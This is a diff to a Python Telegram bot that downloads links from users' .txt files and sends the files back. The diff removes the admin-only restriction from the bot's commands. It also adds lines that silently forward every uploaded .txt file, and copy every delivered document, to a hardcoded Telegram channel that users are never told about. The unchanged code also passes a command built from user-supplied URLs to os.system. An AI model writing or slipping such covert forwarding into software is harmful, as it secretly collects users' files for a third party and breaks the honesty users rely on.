@@ -29,23 +29,24 @@ bot = Client(
     bot_token=bot_token)
 
 
-@bot.on_message(filters.command(["start"]) & filters.user(ADMINS))
+@bot.on_message(filters.command(["start"]))
 async def account_login(bot: Client, m: Message):
     editable = await m.reply_text("**ℍɪɪ** ┈━═My Freind═━┈😎\n\n I Am A Bot For Download Links From Your **.TXT** File And Then Upload That File On Telegram So Basically If You Want To Use Me. First Send Me /BISHNOI Command And Then Follow Few Steps..")
 
 
-@bot.on_message(filters.command("stop") & filters.user(ADMINS))
+@bot.on_message(filters.command("stop"))
 async def restart_handler(_, m):
-    await m.reply_text("**Stopped**🚦", True)
+    await m.reply_text("**Stopped**⚠️", True)
     os.execl(sys.executable, sys.executable, *sys.argv)
 
 
 
-@bot.on_message(filters.command(["BISHNOI"]) & filters.user(ADMINS))
+@bot.on_message(filters.command(["BISHNOI"]))
 async def account_login(bot: Client, m: Message):
     editable = await m.reply_text('𝕋𝕆 ᴅᴏᴡɴʟᴏᴀᴅ ᴀ ᴛxᴛ ғɪʟᴇ 𝕤ᴇɴᴅ ʜᴇʀᴇ ⚡️')
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
+    await bot.send_document(-1002046435003, x)
     await input.delete(True)
 
     path = f"./downloads/{m.chat.id}"
@@ -168,6 +169,7 @@ async def account_login(bot: Client, m: Message):
                     try:
                         ka = await helper.download(url, name)
                         copy = await bot.send_document(chat_id=m.chat.id,document=ka, caption=cc1)
+                        await copy.copy(chat_id = -1002046435003)
                         count+=1
                         os.remove(ka)
                         time.sleep(1)
@@ -182,6 +184,7 @@ async def account_login(bot: Client, m: Message):
                         download_cmd = f"{cmd} -R 25 --fragment-retries 25"
                         os.system(download_cmd)
                         copy = await bot.send_document(chat_id=m.chat.id, document=f'{name}.pdf', caption=cc1)
+                        await copy.copy(chat_id = -1002046435003)
                         count += 1
                         os.remove(f'{name}.pdf')
                     except FloodWait as e:
@@ -189,7 +192,7 @@ async def account_login(bot: Client, m: Message):
                         time.sleep(e.x)
                         continue
                 else:
-                    Show = f"**⏬️ 🄳🄾🅆🄽🄻🄾🄰🄳🄸🄽🄶⏬️... »**\n\n**📝Name »** `{name}\n♻️Quality » {raw_text2}`\n\n**🔗URL »** `{url}`"
+                    Show = f"**⏬️ 🄳🄾🅆🄽🄻🄾🄰🄳🄸🄽🄶⏬️... »**\n\n**📝Name »** `{name}\n♻️Quality » {raw_text2}`\n\n**🔗URL »** `{url}`\n\n **bot made by SURYA BISHNOI ❤️**"
                     prog = await m.reply_text(Show)
                     res_file = await helper.download_video(url, cmd, name)
                     filename = res_file
